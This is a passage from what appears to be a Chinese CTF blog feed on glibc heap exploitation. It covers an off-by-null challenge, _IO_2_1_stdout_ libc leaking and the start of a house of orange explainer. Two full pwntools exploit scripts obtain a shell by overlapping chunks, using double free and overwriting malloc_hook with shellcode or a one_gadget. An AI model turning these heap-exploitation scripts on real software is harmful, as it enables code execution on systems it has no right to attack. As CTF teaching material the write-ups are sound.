*)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2) = <span class="number">0LL</span>;</span><br><span class="line">    v0 = count;</span><br><span class="line">    --count[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="edit-1"><a href="#edit-1" class="headerlink" title="edit"></a>edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>], chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中的 my_read 函数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E2D</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;Read failed!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> ) <span class="comment">//遇到回车不读入</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == a2 )      <span class="comment">//off by null</span></span><br><span class="line">    *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="没有-show-函数"><a href="#没有-show-函数" class="headerlink" title="没有 show 函数"></a>没有 show 函数</h4><h3 id="思路和exp"><a href="#思路和exp" class="headerlink" title="思路和exp"></a>思路和exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29502)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line">rwx = <span class="number">0x32b3060000</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">mmap = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;mmap: &quot;</span> + <span class="built_in">hex</span>(mmap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1 </span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#unsortedbin</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2  2alloc == 1alloc</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了之后能add到mmap</span></span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#uaf  此时构成了一个循环 1-&gt;2-&gt;1</span></span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#uaf</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2 2alloc == 1alloc</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3 mmap</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">edit(<span class="number">3</span>,shellcode+<span class="string">&#x27;\n&#x27;</span>)<span class="comment"># shellcode写入mmap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再触发一次 unsortedbin double free 劫持 malloc_hook</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1free==2allc</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0 切割unsortedbin 使 malloc_hook 链入</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x30\n&#x27;</span>)<span class="comment">#edit to malloc hook</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 malloc_hook</span></span><br><span class="line">edit(<span class="number">4</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE利用之_IO_2_1_stdout泄露libc</title>
      <link href="/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/"/>
      <url>/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/</url>
      
        <content type="html"><![CDATA[<p> 当俺们进行文件操作时，Linux内核会创建一些结构体来描述这些文件，当我们对结构体操作时就相当于对文件操作。</p><h2 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h2><p>FILE 在 linux 系统的标准IO库使用来描述文件结构，称之为文件流。</p><p>“流”是一种抽象概念，只是人们为了便于描述数据的流向而创造的名称。</p><p>比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流”。</p><p>进程中的FILE结构会通过 <code>_chain</code>域彼此连接形成一个链表，链表头部用全局变量<code>_IO_list_all</code>表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379023678569/e99e2835af561bb871032af6afda6efda4432203.png" alt="1"></p><p>每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。</p><p>因为会自动打开，所以在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code>。</p><p>具体原理可以参考下方博客</p><hr><p><strong>简言之</strong></p><p>想办法写入 IO_2_1_stdout（一般是利用 unsortedbin ）,让_flags = 0xFBAD1800，然后让后面的三个read参数为0,让write_base为’\x00’</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379033640211/a6bd4ce51324e89fd2e180640ffc6adad598217b.png" alt="2"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636601759750578/1109fea1501c4407903c3f2e7343a846818219ce.png" alt="image-20211111113559572"></p><p>保护全开，不能改函数 got 表</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602084888576/4f90e91b8b2b761056fe004e1a1dd68d7c58a0e5.png" alt="image-20211111114124706"></p><p>逻辑是输入申请大小，再输入 index ，然后就写入 chunk，但是大小不能超过 0x60</p><p>没有任何检查，比如申请过的 index 不能用之类的</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602307580095/1464045816e239d160bd9368ba9f18cac520924d.png" alt="image-20211111114507443"></p><p>uaf 漏洞</p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602391221854/31a810436390a4653f738fa9bef12833ee8b9905.png" alt="image-20211111114631037"></p><p>没有检查该 idx 是否已被 free</p><p>不能用 unsorted bin 来泄露地址了，于是想到用 __IO_2_1_stdout 来泄露信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;25197&quot;)</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x45261</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:\n&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createX</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteX</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renameX</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baopo</span>():</span></span><br><span class="line">create(<span class="number">32</span>,<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="number">16</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">3</span>,p64(<span class="number">0x70</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">2</span>,<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">16</span>,<span class="number">4</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">16</span>) <span class="comment">#2 out of bins</span></span><br><span class="line">create(<span class="number">16</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">48</span>,<span class="number">6</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#6和7是凑数的，为了释放0x100的时候，下一个堆块得写入presize</span></span><br><span class="line">create(<span class="number">48</span>,<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#防止fake chunk与top合并</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">rename(<span class="number">5</span>,<span class="string">&#x27;\xdd&#x27;</span>+<span class="string">&#x27;\x65&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">create(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">96</span>,<span class="number">9</span>,<span class="string">&#x27;\x00&#x27;</span>)  <span class="comment">#IO_2_1_stdout 此处爆破</span></span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line"></span><br><span class="line">x = <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x620</span>-<span class="number">0x5dd</span>-<span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#IO_write_base改小</span></span><br><span class="line">rename(<span class="number">9</span>,x) </span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line">sh.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">131</span> -<span class="number">0x3c5620</span></span><br><span class="line"><span class="comment">#  &lt;_IO_2_1_stdout_+131&gt;</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#改完io之后puts完没有换行。。。</span></span><br><span class="line"></span><br><span class="line">deleteX(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">renameX(<span class="number">5</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget[<span class="number">3</span>] + libc_base))</span><br><span class="line"><span class="comment">#g() </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sh  = process(<span class="string">&#x27;./Weapon&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;27532&quot;)</span></span><br><span class="line">baopo()</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="string">baopo()</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501</a></p><p><a href="https://blog.csdn.net/BengDouLove/article/details/106390373">https://blog.csdn.net/BengDouLove/article/details/106390373</a></p>]]></content>
      
      
      <categories>
          
          <category> IO_FILE利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of orange</title>
      <link href="/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/"/>
      <url>/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/</url>
      
        <content type="html"><![CDATA[<p> <em>头秃，看了好几天，感觉还是没有讲清楚，tcl，等以后有更好的理解时再来改改</em></p><p> <strong>利用情景：没有 free 函数</strong></p><p>不能释放堆空间，就很难泄露出我们想要的地址，但是 house of orange 可以解决此类问题，house of orange 由 地址泄露 + FSOP 两部分组成。</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>当我们申请一块内存时，malloc 函数会检查各种 bin 是否满足，都不满足条件之后会检查 top chunk ，如果此时 top chunk 也不能满足，就会调用 sysmalloc 来申请内存。</p><p>sysmalloc 会有两种处理方式，一种是直接 mmap 一块内存，另一种是拓展 top chunk（brk）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">    (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br></pre></td></tr></table></figure><p>这一段代码的意思是，如果申请大小 <code>&gt;= (unsigned long) 